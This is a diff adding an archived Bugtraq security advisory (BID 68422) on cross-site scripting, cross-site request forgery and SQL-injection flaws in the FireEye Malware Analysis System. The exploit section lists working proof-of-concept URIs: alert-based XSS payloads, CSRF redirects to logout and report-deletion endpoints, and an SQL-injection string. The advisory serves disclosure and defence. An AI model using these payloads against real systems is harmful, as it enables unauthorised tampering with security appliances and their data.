@@ -1,0 +1,93 @@
+#SpeeDr00t@Black Falcon<br>#bid68422<p><b><span style="font-size: 18pt;">RETIRED: FireEye Malware Analysis System Multiple Security Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/68422/info">info</a><br><a href="http://www.securityfocus.com/bid/68422/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/68422/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/68422/solution">solution</a><br><a href="http://www.securityfocus.com/bid/68422/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				68422
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 02 2014 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 14 2014 12:37AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				kmkz
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues using a browser or readily available tools. To exploit the cross-site scripting and cross-site request-forgery issue, an attacker must entice an unsuspecting user to follow a malicious URI.   <br/> <br/>The following example URIs are available:   <br/> <br/>Cross-site scripting:   <br/> <br/>https://www.example.com/yara/show_ya_file?name=&amp;lt;body onload=alert('XSSED')&amp;gt;   <br/> <br/>https://www.example.com/network/network?new_domain=%3Cscript%3Ealert%28%27XSSED%27%29%3C%2Fscript%3E   <br/> <br/>https://www.example.com/manual/csc?mode=%3C/script%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E   <br/> <br/>Cross-site request-forgery:   <br/> <br/>https://www.example.com/network/network?new_domain=&amp;lt;script&amp;gt;document.location="https://www.example.com/login/logout?notice=Deconnection+kmkz+CSRF+PoC"&amp;lt;/script&amp;gt;   <br/> <br/>https://www.example.com/network/network?new_domain=%3Cscript%3Edocument.location%3D%22https://www.example.com%2Flogin%2Flogout%3Fnotice%3DDeconnection%2Bkmkz%2BCSRF%2BPoC%22%3C%2Fscript%3E   <br/> <br/>https://www.example.com/network/network?new_domain=&amp;lt;script&amp;gt;document.location="https://www.example.com/report/delete_pdf/?id=Alert_Details_fireye-2F_20140502_120000.xml"&amp;lt;/script&amp;gt;   <br/> <br/>https://www.example.com/network/network?new_domain=%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fwww.example.com%2Freport%2Fdelete_pdf%2F%3Fid%3DAlert_Details_fireye-2F_20140502_120000.xml%22%3C%2Fscript%3E   <br/> <br/> <br/>SQL-injection:   <br/> <br/>https://www.example.com/event_stream/send_pcap_file?ev_id=9999 OR SELECT 1,2 FROM events /**   
+	
+		<ul>
+</ul>
+</div>
